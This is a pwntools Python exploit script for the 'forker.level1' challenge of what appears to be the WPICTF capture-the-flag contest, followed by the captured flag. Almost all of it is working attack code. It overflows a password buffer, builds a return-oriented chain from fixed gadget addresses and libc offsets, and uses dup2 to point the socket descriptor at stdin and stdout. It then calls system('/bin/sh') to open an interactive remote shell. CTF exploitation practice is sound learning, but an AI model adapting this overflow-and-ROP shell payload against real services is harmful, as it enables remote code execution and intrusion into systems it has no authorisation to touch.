from pwn import *
import sys

### Config ###
filename = 'forker.level1'
rhost = 'forker1.wpictf.xyz'
rport = 31338

### Binary ###
context.binary = "./forker.level1"
binary = ELF(filename)

### Context ###
#context.arch=elf.arch
context.log_level='INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

### Def function area ###

pop1rdi = 0x0000000000400c13        # : pop rdi; ret;
pop2rsi = 0x0000000000400c11        # : pop rsi; pop r15; ret;
bss = 0x0000000000602100
read = 0x400810
dprintf = 0x400800

### Start exploit ###
if len(sys.argv) == 1:
    p = remote('localhost',31337)
else:
    p = remote(rhost,rport)

# leak = u64(p.recv(6).ljust(8, "\x00"))
# 0x7ffff7a6d460 -> puts

libc_base = 0x7ffff7a6d460 - 0x78460
system = libc_base + 0x47dc0
dup2 = libc_base + 0x1048e0
binsh = libc_base + 0x1a3f20

p.recvuntil('Password:')
buf = "A"*76
buf += '\x58'
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(0) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(4)
buf += p64(pop2rsi) + p64(1) * 2
buf += p64(dup2)
buf += p64(pop1rdi) + p64(binsh) + p64(system)

p.sendline(buf)
p.interactive()
# WPI{custom_shellcode_makes_the_world_go_round}
